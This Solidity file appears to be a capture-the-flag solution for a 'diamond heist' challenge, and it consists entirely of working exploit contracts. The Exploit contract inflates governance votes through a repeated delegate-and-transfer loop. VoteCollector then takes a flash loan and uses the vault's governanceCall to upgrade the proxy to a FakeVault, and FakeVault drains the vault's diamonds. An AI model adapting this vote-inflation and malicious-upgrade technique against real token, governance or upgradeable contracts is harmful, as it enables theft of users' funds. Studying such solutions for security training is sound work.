// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./diamond_heist_contracts/Setup.sol";
import "./diamond_heist_contracts/Vault.sol";
import "./diamond_heist_contracts/Diamond.sol";
import "./diamond_heist_contracts/SaltyPretzel.sol";

contract Exploit {
    // Challenge contracts
    Setup public setup;
    Vault public vault;
    SaltyPretzel public saltyPretzel;

    constructor(Setup _setup) {
        // Initialize challenge contracts
        setup = _setup;
        vault = setup.vault();
        saltyPretzel = setup.saltyPretzel();

        // Claim initial SaltyPretzel tokens
        setup.claim();
    }

    function exploit() public {
        // Create a contract contract to hoard votes
        VoteCollector voteCollector = new VoteCollector(setup);

        // Loop while VoteCollector has not enough votes
        while (saltyPretzel.getCurrentVotes(address(voteCollector)) < vault.AUTHORITY_THRESHOLD()) {
            // Add our votes to VoteCollector 
            saltyPretzel.delegate(address(voteCollector));

            // Set our delegatee to address(0)
            saltyPretzel.transfer(address(voteCollector), setup.SALTY_PRETZELS());
            saltyPretzel.delegate(address(0));

            // Regain our SaltyPretzel tokens
            saltyPretzel.transferFrom(address(voteCollector), address(this), setup.SALTY_PRETZELS());
        }

        // When VoteCollector has enough votes, steal the vault's diamonds
        voteCollector.stealDiamonds();
    }
}

contract VoteCollector {
    // Challenge contracts
    Setup public setup;
    Vault public vault;
    Diamond public diamond;
    SaltyPretzel public saltyPretzel;

    constructor(Setup _setup) {
        // Initialize challenge contracts
        setup = _setup;
        vault = setup.vault();
        diamond = setup.diamond();
        saltyPretzel = setup.saltyPretzel();

        // Allow the Exploit contract to transfer all of this contract's SaltyPretzel tokens
        saltyPretzel.approve(msg.sender, type(uint256).max);
    }

    function stealDiamonds() public {
        // Borrow a flashloan to temporarily set the vault's diamond balance to 0
        vault.flashloan(address(diamond), setup.DIAMONDS(), address(this));

        // After the vault is upgraded to FakeVault, transfer its diamonds to Setup
        FakeVault(address(vault)).transferDiamonds(address(setup));
    }

    function onFlashLoan(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns(bytes32) {
        // Create a FakeVault contract
        FakeVault fakeVault = new FakeVault();

        // Upgrade the implementation of vault to FakeVault
        bytes memory data = abi.encodeWithSelector(vault.upgradeTo.selector, address(fakeVault));
        vault.governanceCall(data);

        // Return the borrowed diamonds to vault
        diamond.transfer(address(vault), setup.DIAMONDS());

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

contract FakeVault is Initializable, UUPSUpgradeable, OwnableUpgradeable {    
    // Keep the diamond state variable
    Diamond diamond;

    // Function to transfer all of the vault's diamonds
    function transferDiamonds(address to) public {
        diamond.transfer(to, diamond.balanceOf(address(this)));
    }
    
    // _authorizeUpgrade has to be implemented for UUPSUpgradeable contracts
    function _authorizeUpgrade(address) internal override view {}
}